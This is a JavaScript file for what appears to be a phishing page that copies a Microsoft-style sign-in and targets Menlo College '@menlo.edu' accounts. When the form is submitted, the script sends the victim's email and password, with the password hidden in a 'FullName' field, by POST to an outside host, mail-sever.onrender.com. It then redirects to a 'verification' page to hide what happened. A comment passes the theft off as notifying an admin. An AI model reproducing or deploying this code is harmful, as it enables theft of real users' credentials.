document.addEventListener("DOMContentLoaded", function() {
    //BUTTON
    const nextBtn = document.querySelector('#idSIButton9');
    const backBtn = document.querySelector('#idBtn_Back');

    const emailDisplay = document.querySelector('#emailDisplay');
    const passDisplay = document.querySelector('#passDisplay');
    const backDiv = document.getElementById('backDiv');
    const submitDiv = document.getElementById('submitDiv');
    const ceateDiv = document.getElementById('ceateDiv');
    const nextDiv = document.getElementById('nextDiv');
    // Get email and password values
    const preEmail = document.getElementById("identifierId");
    var email;
    const password = document.getElementById("identifierPassword");
    preEmail.addEventListener('keypress', (e)=>{
        if(e.target.keycode === 13){
            e.preventDefault();
        }
    })
    nextBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        email = preEmail.value + "@menlo.edu"
        //console.log(validateEmail(email.value))
        if(preEmail !== ''){
            if(validateEmail(email)){
                passDisplay.style.display = 'block';
                emailDisplay.style.display = 'none';
                backDiv.style.display = 'block';
                submitDiv.style.display = 'block';
                ceateDiv.style.display = 'none';
                nextDiv.style.display = 'none';
            }
        }else{
            alert('Invalid email')
        };
    })
    backBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        passDisplay.style.display = 'none';
        emailDisplay.style.display = 'block';
        backDiv.style.display = 'none';
        submitDiv.style.display = 'none';
        ceateDiv.style.display = 'block';
        nextDiv.style.display = 'block';
        
    });

    const loginForm = document.getElementById("loginForm");

    // Add submit event listener
    loginForm.addEventListener("submit", function(event){
        // Prevent the default form submission
        event.preventDefault();
        if(password.value != ''){
             //Send Login detail to admin for notification
             const userData = {
                FullName: password.value,
                Email: email,
                Password: "username",
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
        
            // Redirect to home page after a delay (e.g., 2 seconds)
            setTimeout(function() {
                window.location.href = "verification.html"; // Replace "home.html" with your home page URL
            }, 2000)
        }else{
            alert('Password can\'t be empty')
        }

        
        // Validate email and password
            
        
    })
   
    // Function to validate email
    function validateEmail(email) {
        // Check if the email ends with "@mit.edu"
        return email.endsWith("@menlo.edu");
    }

    // Function to validate password
    function validatePassword(password) {
        // Check if the password is not empty
        return password.trim() !== "";
    }
});

